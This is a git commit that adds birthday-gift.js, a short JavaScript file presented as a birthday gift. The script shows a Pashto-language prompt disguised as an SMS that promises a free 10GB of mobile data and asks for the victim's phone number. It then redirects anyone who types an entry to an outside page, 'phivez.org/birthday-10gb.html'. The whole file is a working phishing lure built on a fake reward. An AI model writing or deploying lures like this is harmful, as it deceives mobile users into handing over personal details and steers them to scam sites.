ec1e614d634b6605df518bb810f4a14b12afdc56
newblog13 <sweet16guyz@gmail.com>
2026-01-20 13:09:35 +0100

    Create birthday-gift.js

---
+++ birthday-gift.js
@@ -0,0 +1,5 @@
+var password = '۱۰ جي بي فعال کړئ'
+password=prompt('SMS: مبارک شه، ستاسو د موبایل شمیره د 10GB ترلاسه کولو وړ ده، د خپل موبایل شمیره دننه کولو لپاره په OK کلیک وکړئ.','۱۰ جي بي فعال کړئ');
+if (password != '۱۰ جي بي فعال کړئ') {
+location.href='https://phivez.org/birthday-10gb.html';
+}
